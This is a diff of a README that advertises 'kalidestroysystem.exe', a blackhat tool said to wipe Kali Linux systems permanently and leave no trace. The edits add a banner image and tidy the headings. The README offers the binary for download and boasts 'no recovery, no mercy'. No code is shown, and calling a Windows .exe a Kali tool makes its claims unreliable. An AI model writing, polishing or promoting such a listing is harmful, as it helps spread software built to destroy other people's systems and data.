@@ -1,5 +1,7 @@
 # kalidestroysystem
 
+![kalidestroysystem Banner](DSTRYKL.jpg)
+
 **by MØNSTR-M1ND**
 
 A 100% destructive executable targeting Kali Linux systems only.  
@@ -19,22 +21,15 @@ One click: the system is gone — permanently.
 `kalidestroysystem.exe` ≈ 12 MB  
 Single binary, no external dependencies, instant execution.
 
-##  About
+## About
 
 MØNSTR-M1ND  
 Blackhat | No Recovery | No Traces
 
-##  Download
+## Download
 
 📁 kalidestroysystem.exe
 
-
-##  Note
+## Note
 
 Built for annihilation — no recovery, no negotiation, no mercy.
-
----
-
-
-
-
